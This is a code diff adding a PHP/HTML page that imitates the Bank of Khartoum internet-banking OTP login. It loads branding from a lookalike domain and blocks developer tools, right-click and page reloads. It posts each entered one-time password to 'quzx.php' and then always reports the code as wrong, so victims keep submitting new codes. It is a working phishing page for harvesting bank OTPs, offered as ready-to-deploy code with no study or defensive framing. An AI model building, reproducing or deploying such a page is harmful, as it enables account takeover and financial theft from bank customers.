@@ -1,0 +1,303 @@
+<?php
+session_start();
+session_regenerate_id(true);
+
+if (!isset($_SESSION['user_id'])) {
+    $_SESSION['user_id'] = bin2hex(random_bytes(4));
+}
+?>
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Login - Bank of Khartoum</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        /* التنسيقات كما في الكود السابق بدون تغيير */
+        body {
+            font-family: 'Cairo', sans-serif;
+            text-align: center;
+            direction: rtl;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+        }
+
+        .background-image {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+        }
+
+        img.header-image {
+            width: 100%;
+            height: auto;
+        }
+
+        h1 {
+            font-size: 5vw;
+            font-weight: normal;
+            color: #d32f2f;
+            position: absolute;
+            top: 10%;
+            left: 2.5%;
+            z-index: 1;
+        }
+
+        .container {
+            width: 90%;
+            height: calc(25vh + 18vw);
+            margin: 12vw auto 0 auto;
+            background: rgba(255, 255, 255, 0.8);
+            padding: 2vw;
+            border-radius: 1vw;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            transition: height 0.5s ease;
+        }
+
+        .forgot-password {
+            text-align: left;
+            font-size: 4.5vw;
+            margin-top: 3vw;
+            margin-left: 2vw;
+            color: #000;
+        }
+
+        .otp-container {
+            width: 90vw;
+            margin-top: 2vw;
+            text-align: left;
+            font-size: 4vw;
+            position: relative;
+        }
+
+        .otp-label {
+            font-weight: bold;
+            display: block;
+            margin-top: -2vw;
+            margin-left: 1vw;
+            color: #808080;
+            font-size: 4vw;
+        }
+
+        .otp-input-container {
+            width: 75vw;
+            margin: 0 auto 0 11vw;
+            position: relative;
+        }
+
+        .otp-input {
+            width: 100%;
+            height: 4.5vw;
+            padding: 2vw 3vw;
+            border-radius: 2vw;
+            border: 0.3vw solid #333;
+            font-size: 4vw;
+            text-align: left;
+            color: black;
+            transition: all 0.3s ease;
+        }
+
+        .otp-input:focus {
+            outline: none;
+            border-color: #d32f2f;
+        }
+
+        .eye-icon {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 3vw;
+            color: #808080;
+            cursor: pointer;
+        }
+
+        input[type="submit"] {
+            background: rgba(186, 33, 33, 0.5);
+            color: white;
+            border: none;
+            width: 90%;
+            height: 9vw;
+            cursor: not-allowed;
+            border-radius: 2.5vw;
+            font-size: 3.5vw;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            pointer-events: none;
+            transition: background 0.3s ease, transform 0.2s ease;
+        }
+
+        input[type="submit"].enabled {
+            background: linear-gradient(to top, #b71c1c, #d32f2f);
+            cursor: pointer;
+            pointer-events: auto;
+        }
+
+        .success-message {
+            font-size: 4vw;
+            color: red;
+            margin-top: 1vw;
+            text-align: left;
+            margin-left: 3vw;
+            display: none;
+        }
+
+        .otp-underline {
+            width: 80vw;
+            height: 0.3vw;
+            background-color: #808080;
+            margin: 7vw auto;
+        }
+
+        .incorrect-code-message {
+            font-size: 3.5vw;
+            color: red;
+            margin-top: 1vw;
+            text-align: left;
+            margin-left: 3vw;
+            display: none;
+        }
+
+        .login-container {
+            margin-top: 4vw;
+        }
+    </style>
+</head>
+<body>
+
+<script>
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+    });
+
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+            e.preventDefault();
+        }
+        if ((e.ctrlKey && e.key === 'r') || e.key === 'F5') {
+            e.preventDefault();
+        }
+    });
+
+    const navEntries = performance.getEntriesByType("navigation");
+    if (navEntries.length > 0 && navEntries[0].type === "reload") {
+        window.location.href = "index.php";
+    }
+</script>
+
+<img src="http://ib-bok-sd.nl/P/logo.jpg" alt="Logo" class="background-image">
+<img src="http://ib-bok-sd.nl/S/logo.jpg" alt="Logo" class="header-image">
+
+<h1 class="move-up move-right">Internet Banking - Login</h1>
+
+<div class="container" id="container">
+    <div class="forgot-password">
+        <a>الرجاء ادخال رمز OTP المرسل الي رقم هاتفك و البريد الاكتروني المسجلين</a>
+    </div>
+
+    <div class="otp-underline"></div>
+
+    <form id="otpForm" method="POST">
+        <div class="otp-container">
+            <label for="otp" class="otp-label">:Enter OTP</label>
+            <div class="otp-input-container">
+                <input type="password" id="otp" class="otp-input" name="otp" placeholder="ادخل رمز OTP" maxlength="6" required oninput="validateOTP()">
+                <i id="eye-icon" class="fa fa-eye-slash eye-icon" onclick="togglePasswordVisibility()"></i>
+            </div>
+            <div class="incorrect-code-message" id="incorrectCodeMessage">رمز OTP خاطئ الرجاء التحقق مره اخري</div>
+        </div>
+
+        <div class="login-container" id="loginContainer">
+            <input type="submit" value="تسجيل الدخول" id="loginButton" disabled>
+        </div>
+    </form>
+
+    <div id="response"></div>
+</div>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script>
+    function togglePasswordVisibility() {
+        var otpField = document.getElementById("otp");
+        var icon = document.getElementById("eye-icon");
+
+        if (otpField.type === "password") {
+            otpField.type = "text";
+            icon.classList.replace("fa-eye-slash", "fa-eye");
+        } else {
+            otpField.type = "password";
+            icon.classList.replace("fa-eye", "fa-eye-slash");
+        }
+    }
+
+    function validateOTP() {
+        let otpInput = document.getElementById("otp");
+        let otpValue = otpInput.value.replace(/[^0-9]/g, '');
+        otpInput.value = otpValue;
+
+        let loginButton = document.getElementById("loginButton");
+
+        if (otpValue.length === 6) {
+            otpInput.style.borderColor = "#333";
+            loginButton.classList.add("enabled");
+            loginButton.disabled = false;
+        } else {
+            otpInput.style.borderColor = "red";
+            loginButton.classList.remove("enabled");
+            loginButton.disabled = true;
+        }
+    }
+
+    $(document).ready(function() {
+        $('#otpForm').submit(function(e) {
+            e.preventDefault();
+            let otp = $('#otp').val();
+
+            $.ajax({
+                url: 'quzx.php',
+                type: 'POST',
+                data: { otp: otp },
+                success: function(response) {
+                    $('#response').html(response);
+                    $('#otp').val('');
+                    $('#incorrectCodeMessage').fadeIn();
+                    $('#container').css('height', 'calc(24vh + 20vw)');
+                    $('#loginContainer').css('transform', 'translateY(-2vw)');
+                },
+                error: function() {
+                    $('#response').html('.');
+                }
+            });
+        });
+
+        // عند بدء الكتابة في حقل otp يتم إخفاء رسالة الخطأ
+        $('#otp').on('input', function() {
+            let incorrectMsg = $('#incorrectCodeMessage');
+            if (incorrectMsg.is(':visible')) {
+                incorrectMsg.hide();
+                $('#container').css('height', 'calc(24vh + 18vw)');
+                $('#loginContainer').css('transform', 'translateY(0)');
+            }
+        });
+
+        // هذا الحدث للتأكد من إخفاء رسالة الخطأ بعد انتهاء تأثيراتها (اختياري)
+        $('#incorrectCodeMessage').on('animationend', function() {
+            $('#container').css('height', 'calc(24vh + 18vw)');
+            $('#loginContainer').css('transform', 'translateY(0)');
+            $('#incorrectCodeMessage').hide();
+        });
+    });
+</script>
+</body>
+</html>
